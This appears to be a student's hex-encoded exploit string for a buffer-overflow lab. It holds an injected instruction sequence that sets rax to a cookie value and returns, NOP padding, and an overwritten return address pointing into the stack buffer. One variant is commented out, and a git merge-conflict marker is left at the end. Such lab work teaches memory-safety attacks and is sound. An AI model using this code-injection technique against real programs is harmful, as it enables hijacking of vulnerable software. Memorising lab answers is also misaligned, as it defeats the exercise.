
/* 54                   	/* push   %rsp */ 
55                   	/* push   %rbp */ 
48 89 e5             	/* mov    %rsp,%rbp */ 
48 83 ec 20          	/* sub    $0x20,%rsp */ 
48 c7 c0 ed 24 25 62 	/* mov    $0x622524ed,%rax */ 
5c                   	/* pop    %rsp */ 
5d                   	/* pop    %rbp */ 
c3                   	/* retq */ 
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 
50 2f 78 55 00 00 00 00 */ /* address of beginning of buffer */


48 c7 c0 ed 24 25 62 	/* mov    $0x622524ed,%rax */ 
c3                   	/* retq */ 
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 /* address of rbp */
50 2f 78 55 00 00 00 00
>>>>>>> bd5da4846aafd6dbb021d4ad127a46a24c53bdaf
